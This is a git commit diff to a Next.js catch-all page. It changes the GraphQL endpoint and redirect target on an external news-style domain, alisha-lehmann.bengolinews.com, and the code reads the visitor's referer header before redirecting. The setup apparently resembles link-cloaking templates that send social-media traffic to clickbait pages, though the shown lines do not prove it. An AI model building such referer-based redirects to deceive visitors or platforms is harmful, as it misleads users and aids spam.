f55b7dda557723e82c559fcf2af74946ddd2563b
flim4xpro <147311427+flim4xpro@users.noreply.github.com>
2024-03-12 22:55:04 +0600

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://alisha-lehmann.bengolinews.com/wp/graphql"
+	const endpoint = "https://alisha-lehmann.bengolinews.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alisha-lehmann.bengolinews.com/wp/` + encodeURI(path as string)
+					`https://alisha-lehmann.bengolinews.com/` + encodeURI(path as string)
 				}`,
 			},
 		};
